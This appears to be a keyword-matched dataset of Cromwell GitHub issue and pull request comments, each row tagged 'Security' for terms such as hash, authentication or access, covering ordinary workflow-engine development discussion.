Security,I think this looks like a permission issue. Double check that the cromwell server has AWS authentication to read and write to the bucket you listed,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4341#issuecomment-434937628:90,authenticat,authentication,90,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4341#issuecomment-434937628,1,['authenticat'],['authentication']
Security,"I think you might be right that hashing is taking a long time. There's a minimal amount of computational work that needs to be done to compute a hash, and I don't know off the top of my head which algorithm we use. I suspect we would entertain alternatives that are faster and provide an identical level of accuracy, but can't make any compromises on hash collisions that could mis-identify files and cause call caching to give wrong results. For what it's worth, most Cromwell users today use cloud storage which has APIs to quickly retrieve pre-computed hashes, which explains why more users haven't surfaced this very valid issue.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6213#issuecomment-796936216:32,hash,hashing,32,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6213#issuecomment-796936216,4,['hash'],"['hash', 'hashes', 'hashing']"
Security,I wanted to make minimal changes. This started as a vault rotation/audit ticket. But I definitely see the annoyance in having it partially removed.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6331#issuecomment-832961406:67,audit,audit,67,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6331#issuecomment-832961406,1,['audit'],['audit']
Security,"I was asked to modify all the services so that the /api endpoint authorizes users based on their membership in ldap (filrecloud registration). Those are the four new lines added to the end of the file. The other changes are to remove things that are already set as the defaults in the openidc-proxy, so there is no reason to be specifying them. You only need to specify values that are different from the defaults. . The defaults are visible here:. https://github.com/broadinstitute/openidc-baseimage/blob/master/run.sh. and here. https://github.com/broadinstitute/dockerfiles/blob/master/openidc-proxy/override.sh. I also noticed that cromwell and thurloe are the only ones that run on port 8000, rather than port 8080, so that is why you are having to specify the PROXY_URLs as they are non-standard. All the other services in firecloud run on port 8080.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/359#issuecomment-170019993:65,authoriz,authorizes,65,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/359#issuecomment-170019993,1,['authoriz'],['authorizes']
Security,"I was testing some call caching behaviors. Specifically I tried to call cache on local backend with the ""hash the file path"" method which would hash a file path even though the file doesn't exist. The job would then try to find a cache hit for this path even though the file doesn't exist",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2006#issuecomment-280759949:105,hash,hash,105,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2006#issuecomment-280759949,2,['hash'],['hash']
Security,"I was trying to find a way to re-arrange the conf wrt file systems and came up with this; https://gist.github.com/Horneth/42d5656afced5795f0d2cafe3e9ef0f2. For the Firecloud case, one could have . ``` hcon; file-systems {; gcs {; authentication {; authenticationScheme = ""refresh_token""; refreshTokenAuth = {; client_id = """"; client_secret = """"; }; }; }; }; ```. instead of. ``` hcon; file-systems {; gcs {; authentication = ""default""; }; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/627#issuecomment-203071973:230,authenticat,authentication,230,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/627#issuecomment-203071973,3,['authenticat'],"['authentication', 'authenticationScheme']"
Security,I will run a test from Cromwell. In testing the GCP Batch SDK directly it will only do authentication with the docker.io prefix.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2319010020:87,authenticat,authentication,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2319010020,1,['authenticat'],['authentication']
Security,"I would check with @Horneth - I know CC is now batching things into some maximum number of hash lookups at a time, but whether it gives up if it finds it can’t continue I’m not sure?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1316#issuecomment-324166084:91,hash,hash,91,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1316#issuecomment-324166084,1,['hash'],['hash']
Security,"I'd agree with that. I've always felt that the VA should only return a yes/no, although perhaps my issue is being overly pedantic with the name of the actor. The argument for this though was that because people (including yourself, IIRC) didn't want to receive the simple yes/no and thus replicate the parsing of the input files the VA was handing back the parsed components. Once the validation is taken out of WorkflowDescriptor's apply() method it becomes a simple case class constructed by those same values so the effect is the same.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/569#issuecomment-197505173:385,validat,validation,385,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/569#issuecomment-197505173,2,['validat'],['validation']
Security,"I'd argue that the arbitrary KV thing was one of the largest mistakes from Original WDL (i.e. what came out of the 2 weeks of us locking ourselves in a room and figuring it all out) as it destroys portability unless one adds *some* structure to it. We've doubled down on it over the years by adding what IMO should be Cromwell workflow options into the runtime block which means that a WDL can now have important control information on it which might ruin the portability of that workflow. The worst example I can think of is `backend` which is a purely Cromwell concept - what happens when that workflow goes to run on DNAnexus? What happens when `backend` is *also* a concept in another engine but it means something else? What happens when one engine interprets `cpu` to mean ""at least this much"" and another ""exactly this much""? What happens when in the former case the user gets charged more money than they thought because more memory than they needed was allocated? What happens when one engine assumes `mem` is just a number representing GB and can't parse a string w/ units?. (admittedly `mem` is a bad example as it's one of the very few things in `runtime` the spec is actually opinionated about, but you get the point). If the goal is to decouple Cromwell from WDL, the most obvious target is the `runtime` section. If people need more control over their Cromwell experience the answer is to a) provide that information in a way which doesn't destroy workflow portability of the WDL and b) expose that via Firecloud if those users need Firecloud. FWIW one of my primary goals for WDL 1.0 is a massive redo of `runtime` including removing the arbitrariness of it. If things are implementation specific they can be passed in to that engine separately, which would also help maintain the portability of the workflow itself.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2990#issuecomment-349459099:1502,expose,expose,1502,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2990#issuecomment-349459099,1,['expose'],['expose']
Security,"I'd suggest titling this something like ""Consistently resolve Docker labels to hashes within a workflow"" that captures the point of this, if in fact that is the point. 😄",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2094#issuecomment-289526079:79,hash,hashes,79,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2094#issuecomment-289526079,1,['hash'],['hashes']
Security,"I'll largely defer to @cjllanwarne, @mcovarr, or @danbills on the specifics, but it seems that you could specify the runtime attribute you need and how to interpret it by customizing the SLURM backend in the config:. https://cromwell.readthedocs.io/en/stable/backends/SLURM/. If I'm reading the docs correctly, it might be possible to inject your `module load` command into the `--wrap` argument.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4997#issuecomment-505658382:335,inject,inject,335,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4997#issuecomment-505658382,1,['inject'],['inject']
Security,I'm checking out WDL/Cromwell at the moment and this feature would make Cromwell definitely more interesting. It would make it much easier to run reproducible pipelines without relying on docker. (Docker is a no go on our cluster because it gives users root access.),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-352784888:258,access,access,258,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-352784888,1,['access'],['access']
Security,"I'm getting the same error with this wdl: [mutect2-replicate-validation.zip](https://github.com/broadinstitute/cromwell/files/2242528/mutect2-replicate-validation.zip). And here is the dependency file: [wdl-dependencies.zip](https://github.com/broadinstitute/cromwell/files/2242529/wdl-dependencies.zip). This happens in versions 30 and up. When I run this in v29, cromwell doesn't throw an error but it hangs after completing the first task. . tsato@gsa5:novaseq: java -jar $wom validate mutect2-replicate-validation.wdl; Exception in thread ""main"" java.lang.RuntimeException: This workflow contains a cyclic dependency on m2.Mutect2.filtered_vcf; 	at wdl.draft2.model.Scope.childGraphNodesSorted(Scope.scala:53); 	at wdl.draft2.model.Scope.childGraphNodesSorted$(Scope.scala:44); 	at wdl.draft2.model.WdlWorkflow.childGraphNodesSorted$lzycompute(WdlWorkflow.scala:46); 	at wdl.draft2.model.WdlWorkflow.childGraphNodesSorted(WdlWorkflow.scala:46); 	at wdl.transforms.draft2.wdlom2wom.WdlDraft2WomGraphMaker$.toWomGraph(WdlDraft2WomGraphMaker.scala:97); 	at wdl.transforms.draft2.wdlom2wom.WdlDraft2WomGraphMaker$.toWomGraph(WdlDraft2WomGraphMaker.scala:18); 	at wom.transforms.WomGraphMaker$Ops.toWomGraph(WomGraphMaker.scala:8); 	at wom.transforms.WomGraphMaker$Ops.toWomGraph$(WomGraphMaker.scala:8); 	at wom.transforms.WomGraphMaker$ops$$anon$1.toWomGraph(WomGraphMaker.scala:8); 	at wdl.transforms.draft2.wdlom2wom.WdlDraft2WomWorkflowDefinitionMaker$.toWomWorkflowDefinition(WdlDraft2WomWorkflowDefinitionMaker.scala:14); 	at wdl.transforms.draft2.wdlom2wom.WdlDraft2WomWorkflowDefinitionMaker$.toWomWorkflowDefinition(WdlDraft2WomWorkflowDefinitionMaker.scala:10); 	at wom.transforms.WomWorkflowDefinitionMaker$Ops.toWomWorkflowDefinition(WomWorkflowDefinitionMaker.scala:8); 	at wom.transforms.WomWorkflowDefinitionMaker$Ops.toWomWorkflowDefinition$(WomWorkflowDefinitionMaker.scala:8); 	at wom.transforms.WomWorkflowDefinitionMaker$ops$$anon$1.toWomWorkflowDefinition(WomWorkflowDefinitionMak",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3143#issuecomment-408976502:61,validat,validation,61,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3143#issuecomment-408976502,4,['validat'],"['validate', 'validation']"
Security,"I'm guessing that the ""people aren't around"" thing isn't going to change at 5pm on a Friday, so .... I'm thinking now that instead, perhaps the thing to do is to also have the actor know if read is on and if write is on. When the actor spins up, it ...; - If read is on, just starts determining the cache hit status w/o being asked; - If write is on, starts hashing everything; - If both are on, starts hashing everything but is checking for cache hit until a miss occurs, at which point it's just generating hashes. The actor could then receive two messages, one is ""are you a cache hit"" and the other is ""please now persist to the store"" (if you asked for cache hit status before it was done, perhaps it could send back a ""come back later"" message - that way you can avoid returning the Futures, although perhaps people like that). We know for a fact that if read is on that we'll be checking the cache, so might as well start that ASAP. If write is on, we're potentially wasting energy - e.g. if a job fails, but presumably (hopefully!) job successes are more common than job failures and we can get a jumpstart on the process.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1225#issuecomment-236289880:358,hash,hashing,358,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1225#issuecomment-236289880,3,['hash'],"['hashes', 'hashing']"
Security,"I'm having the same issue, is there any solution other than `docker.hash-lookup.enabled = false` because it may cause problems for call caching",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5178#issuecomment-1250348746:68,hash,hash-lookup,68,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5178#issuecomment-1250348746,1,['hash'],['hash-lookup']
Security,I'm marking this as a `womtool` bug since your examples shouldn't have been passing validation.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4218#issuecomment-428328020:84,validat,validation,84,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4218#issuecomment-428328020,1,['validat'],['validation']
Security,I'm pretty sure if you see this message it means that it wasn't able to get the hash at all,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2538#issuecomment-321823882:80,hash,hash,80,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2538#issuecomment-321823882,1,['hash'],['hash']
Security,"I'm thinking having more a ""google auth template"" in the conf, with all the auth mode supported by cromwell.; And each section of the conf that needs google authentication (JES genomics, gcs filesystem,...) would provide the auth scheme that it wants to use for this particular feature.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/627#issuecomment-203481252:157,authenticat,authentication,157,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/627#issuecomment-203481252,1,['authenticat'],['authentication']
Security,"I'm thinking perhaps this should be address instead through the use of docker User Namespaces and described in the documentation (a critical part of the solution!). When docker runs a container as root, it isolates the user/groups from the host definitions and instead remaps them. This could be important to a user for two reasons. Once, files written as root in the container will instead be written as this remapped user. Second, since IO on the underlying host VM is currently done as root, the container can read files as root. So if you mounted in /etc/passwd you could read/write on top of that. For a good tutorial see:. E.g. http://blog.aquasec.com/docker-1.10-user-namespace. For more details see:. https://docs.docker.com/engine/reference/commandline/dockerd/#daemon-user-namespace-options. Also pinging @davidbernick for more thoughts from a security perspective",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2053#issuecomment-284430367:854,secur,security,854,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2053#issuecomment-284430367,1,['secur'],['security']
Security,"I'm with @cjllanwarne in favouring some form of disclaimer on this, wanting as little as you to be or feel actually responsible for others' security!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1653#issuecomment-259256319:140,secur,security,140,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1653#issuecomment-259256319,1,['secur'],['security']
Security,I've been looking into a solution that uses [VPC SC settings](https://cloud.google.com/vpc-service-controls) to restrict bucket egress to specific locations. The gist of it is the owner of the docker image puts the container registry in a project that is within a VPC SC perimeter. The docker image owner will need to configure the perimeter such that only VMs from specific ipRanges can access the bucket/docker image. I've put the details and instructions in [this doc](https://docs.google.com/document/d/1SlmleVb9YOmOEwMOFLDzfPq4EX4Sq1WfTcA4gTnnYx0/edit?usp=sharing) that I've currently shared with the Broad.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-921150372:388,access,access,388,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-921150372,1,['access'],['access']
Security,"I've had a request from @geoffjentry and @mcovarr to convert the ""validation response aggregation"" into a separate actor - see https://docs.google.com/a/broadinstitute.com/document/d/1qTXiPtiJcmfmWghLC_uBeWlL2SuCE2Ek1xBiT0j8-iQ/edit?usp=sharing - I'll rework this PR then re-open",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/688#issuecomment-207589678:66,validat,validation,66,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/688#issuecomment-207589678,1,['validat'],['validation']
Security,"I've never used Cromwell this way but my understanding is that good call caching performance is heavily dependent on cloud object storage. This is because it returns checksums in a short, constant time.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7480#issuecomment-2269738159:166,checksum,checksums,166,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7480#issuecomment-2269738159,1,['checksum'],['checksums']
Security,"I've seen issues before where people struggle to access entries in pairs of pairs. I know we're planning another round of WDL fixup soon. My interim advice would be to begin by extracting the first layer of left and right as separate declarations in the scatter, e.g. ```; scatter(p in pairs); Pair[A,B] lefts = p.left; Pair[C,D] rights = p.right. call x { input: i = lefts.left}; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2334#issuecomment-314076887:49,access,access,49,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2334#issuecomment-314076887,1,['access'],['access']
Security,"I've worked out what happened, but I don't know if I can resolve this next problem. . I had call-caching turned on for SFS, and this was MD5 hash was being calculated by Cromwell on the login node, however for 2x 100GB BAM files at each step this was (obviously in retrospect) a resource drain. This was only applicable to backends that use the Local Filesystem (GCS and S3 file systems probably use their blob / object id). If you come across this issue, you might have a couple of solutions:; - Turn off call-caching, might not matter to you.; - If you're not using containers, you might be able to get away with the [path+modtime caching strategy](https://cromwell.readthedocs.io/en/stable/Configuring/#local-filesystem-options), requires you to use the [`soft-link` copying strategy](https://cromwell.readthedocs.io/en/stable/backends/HPC/#shared-filesystem).; - If you **are** using containers, you're out of luck unfortunately.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4945#issuecomment-507482774:141,hash,hash,141,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4945#issuecomment-507482774,1,['hash'],['hash']
Security,"IMO if we put any security recommendations in our README we should be very careful to disclaimer it. **Heavily**. Maybe with something along the lines of:. ```; Warning! ; - Only YOU are responsible for your own security! ; - Cromwell is NOT a security appliance! ; - What follows are ideas and starting points and not necessarily a secure system configuration in your situation""; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1653#issuecomment-259192538:18,secur,security,18,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1653#issuecomment-259192538,4,['secur'],"['secure', 'security']"
Security,"IMO yes as that's the stated purpose of DOS, to provide access to the **same** file in **different** locations. . Since this level of work is really for the blue box stuff and that's not **quite** the same as DOS yet I'd check with the relevant folks on our side and in particular try to have them to circulate that question among their larger group.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3759#issuecomment-396064853:56,access,access,56,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3759#issuecomment-396064853,1,['access'],['access']
Security,"IT should be able to get the hash. Anyway, in this case, it's not a big; deal, since this is part of our github testing. On Fri, Aug 11, 2017 at 11:22 AM, Thib <notifications@github.com> wrote:. > It can run the task without having its hash, it just won't try to call; > cache it nor write it to the cache; >; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/2538#issuecomment-321842808>,; > or mute the thread; > <https://github.com/notifications/unsubscribe-auth/ACDXk4g7uP1uJPFhouOoyfne9aGXQrA8ks5sXHHBgaJpZM4O0GvF>; > .; >. -- ; Lee Lichtenstein; Broad Institute; 75 Ames Street, Room 8011A; Cambridge, MA 02142; 617 714 8632",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2538#issuecomment-321869435:29,hash,hash,29,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2538#issuecomment-321869435,2,['hash'],['hash']
Security,"If `/cromwell-executions/` is referring to the root of your Mac system, I would not expect that to work due to a Mac feature known as [System Integrity Protection](https://support.apple.com/en-us/HT204899). You can test this in isolation by issuing `sudo mkdir /test` which returns `mkdir: /test: Read-only file system` for me (Mac OS 12.2.1). I do not recommend using an escalation to `root` to work around, well, pretty much anything.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6686#issuecomment-1064212178:142,Integrity,Integrity,142,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6686#issuecomment-1064212178,1,['Integrity'],['Integrity']
Security,"If it's causing users real grief when they accidentally omit a curly brace and Cromwell hangs forever then I think we should validate that Cromwell now does the Right Thing in that circumstance, and continues to do the Right Thing going forward. Maybe building out that Centaur infrastructure isn't part of this particular ticket, but it seems like something worth doing (especially since I doubt it would be that much effort). ; ; People who actually submit pictures of Gumby deserve whatever they get.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2500#issuecomment-318533390:125,validat,validate,125,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2500#issuecomment-318533390,1,['validat'],['validate']
Security,"If preemptible is requested, cost is being considered a higher priority; than time. Preempting within 10-20 minutes is not going to rack up much; cost. I could imagine a default cap of 10-20 for the number of early retries. If; the user cares a lot about time, it may be useful to expose it as a; parameter, but this seems less important for the common case. On Wed, Apr 12, 2017 at 2:46 PM, Jeff Gentry <notifications@github.com>; wrote:. > So what if a user actually means they only want to preempt N times no; > matter what? How do we know which the user really means?; >; > Sometimes it's about time, not cost.; >; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/2167#issuecomment-293671865>,; > or mute the thread; > <https://github.com/notifications/unsubscribe-auth/AFK12asbeR0RAQpx0AGY7zQuqqlWtUIcks5rvRwTgaJpZM4M70XZ>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2167#issuecomment-293678971:281,expose,expose,281,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2167#issuecomment-293678971,1,['expose'],['expose']
Security,"If the command is put into an env var, can the command run in the container be just $MYVAR ?. The process running Cromwell already needs read-only access to the bucket, to get the result code. And the config is already done by CloudFormation or script. I’d prefer one-time config to having to rewrite workflows.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4216#issuecomment-427597353:147,access,access,147,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4216#issuecomment-427597353,1,['access'],['access']
Security,"If the image is not on dockerhub but exists locally where the Cromwell application is running then it should be able to find the hash if `docker.hash-lookup.method = ""local""`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2538#issuecomment-321872886:129,hash,hash,129,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2538#issuecomment-321872886,2,['hash'],"['hash', 'hash-lookup']"
Security,"If this ever does get fixed - the last version that didn't throw `No getWomBundle method implemented in CWL v1` (`31.1`) threw an error for me when I ran on https://github.com/NCI-GDC/gdc-dnaseq-cwl/blob/master/workflows/dnaseq/transform.cwl:. ```; $ java -jar ~/bin/womtool-31.1.jar womgraph transform.cwl; Exception in thread ""main"" scala.MatchError: WomMaybePopulatedFileType (of class wom.types.WomMaybePopulatedFileType$); 	at womtool.graph.WomGraph$.fakeInput(WomGraph.scala:222); 	at womtool.graph.WomGraph$.$anonfun$womExecutableFromCwl$2(WomGraph.scala:205); 	at scala.collection.TraversableLike.$anonfun$map$1(TraversableLike.scala:234); 	at scala.collection.immutable.HashMap$HashMap1.foreach(HashMap.scala:231); 	at scala.collection.immutable.HashMap$HashTrieMap.foreach(HashMap.scala:462); 	at scala.collection.TraversableLike.map(TraversableLike.scala:234); 	at scala.collection.TraversableLike.map$(TraversableLike.scala:227); 	at scala.collection.AbstractTraversable.map(Traversable.scala:104); 	at womtool.graph.WomGraph$.$anonfun$womExecutableFromCwl$1(WomGraph.scala:205); 	at scala.util.Either.map(Either.scala:350); 	at womtool.graph.WomGraph$.womExecutableFromCwl(WomGraph.scala:201); 	at womtool.graph.WomGraph$.fromFiles(WomGraph.scala:172); 	at womtool.Main$.$anonfun$womGraph$2(Main.scala:98); 	at womtool.Main$.continueIf(Main.scala:102); 	at womtool.Main$.womGraph(Main.scala:96); 	at womtool.Main$.dispatchCommand(Main.scala:38); 	at womtool.Main$.delayedEndpoint$womtool$Main$1(Main.scala:167); 	at womtool.Main$delayedInit$body.apply(Main.scala:12); 	at scala.Function0.apply$mcV$sp(Function0.scala:34); 	at scala.Function0.apply$mcV$sp$(Function0.scala:34); 	at scala.runtime.AbstractFunction0.apply$mcV$sp(AbstractFunction0.scala:12); 	at scala.App.$anonfun$main$1$adapted(App.scala:76); 	at scala.collection.immutable.List.foreach(List.scala:389); 	at scala.App.main(App.scala:76); 	at scala.App.main$(App.scala:74); 	at womtool.Main$.main(Main.scala:12); 	at womtool",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4119#issuecomment-584388032:679,Hash,HashMap,679,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4119#issuecomment-584388032,5,['Hash'],"['HashMap', 'HashTrieMap']"
Security,"If you are a Mac user and are also experiencing this issue, you have to compile cromwell from source and change file `backend/src/main/scala/cromwell/backend/standard/StandardAsyncExecutionActor.scala` as so: ; ```; - |mkfifo ""$$$out"" ""$$$err""; - |trap 'rm ""$$$out"" ""$$$err""' EXIT; + |touch ""$$$out"" ""$$$err""; |touch $stdoutRedirection $stderrRedirection; - |tee $stdoutRedirection < ""$$$out"" &; - |tee $stderrRedirection < ""$$$err"" >&2 &; ```. This will allow you bypass the `System Integrity Protection` and produce stdout and stderr logs if running local.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6686#issuecomment-1171538706:484,Integrity,Integrity,484,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6686#issuecomment-1171538706,1,['Integrity'],['Integrity']
Security,If you don't want to pull directly develop I can provide the oldest git hash that fixes this bug,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/576#issuecomment-197941787:72,hash,hash,72,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/576#issuecomment-197941787,1,['hash'],['hash']
Security,"In WDL 1.0 onwards task inputs must be in an `input` block: https://github.com/openwdl/wdl/blob/main/versions/1.0/SPEC.md#task-inputs. The following modification validates as expected:. `Workflow.wdl`; ```; version development. import ""WDLTesting/src/wdl/WriteTask.wdl"" as Write. workflow TestingWF; {; call Write.WriteTask as Writer; {; input:; input1 = ""Foo""; }. }; ```. `WriteTask.wdl`; ```; version development. #################################################################################################; ## 				This WDL script writes its inputs to stdout				 ##; #################################################################################################. task WriteTask {. input {; String input1	# Variable with no default value; String input2 = ""Default""; }; 	; command <<<; echo ""input1 = ${input1}""; echo ""input2 = ${input2}""; >>>; 	; output {; String	isDone = input2; }; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6438#issuecomment-881126827:162,validat,validates,162,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6438#issuecomment-881126827,1,['validat'],['validates']
Security,"In a scatter of 20500 shards, we ran a task that basically took in one file input and output a glob of files. We first tried this with a glob where we expected ~900 files to be output and no memory issues were found and everything went relatively smoothly. Because of some outside factors we decided to change this task to instead output ~3000 files in the glob. After about 13000 tasks were processed(Sucess -> Done) we started seeing some slow down that coincided with errors in the logs like the following:. ```; 2016-08-03 03:34:04,971 cromwell-system-akka.actor.default-dispatcher-51 WARN - Caught exception, retrying: Remote host closed connection during handshake; javax.net.ssl.SSLHandshakeException: Remote host closed connection during handshake; at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:992) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.performInitialHandshake(SSLSocketImpl.java:1375) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1403) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1387) ~[na:1.8.0_72]; at sun.net.www.protocol.https.HttpsClient.afterConnect(HttpsClient.java:559) ~[na:1.8.0_72]; at sun.net.www.protocol.https.AbstractDelegateHttpsURLConnection.connect(AbstractDelegateHttpsURLConnection.java:185) ~[na:1.8.0_72]; at sun.net.www.protocol.https.HttpsURLConnectionImpl.connect(HttpsURLConnectionImpl.java:153) ~[na:1.8.0_72]; at com.google.api.client.http.javanet.NetHttpRequest.execute(NetHttpRequest.java:93) ~[cromwell.jar:0.19]; at com.google.api.client.http.HttpRequest.execute(HttpRequest.java:972) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:419) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:352) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201:764,secur,security,764,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201,3,['secur'],['security']
Security,"In case someone is looking to acheive this: The ~wdl task that runs as part of configuration has access to 'job_name'. I have passed this through as an environment variable. . ```; submit-docker = """"""; docker run \; --entrypoint ${job_shell} \; -e CROMWELL_JOB_NAME=${job_name} \; ```. Side note it would be nice if the variables available to that conf script were documented - I am reverse engineering from the example configs.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1575#issuecomment-426880721:97,access,access,97,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1575#issuecomment-426880721,1,['access'],['access']
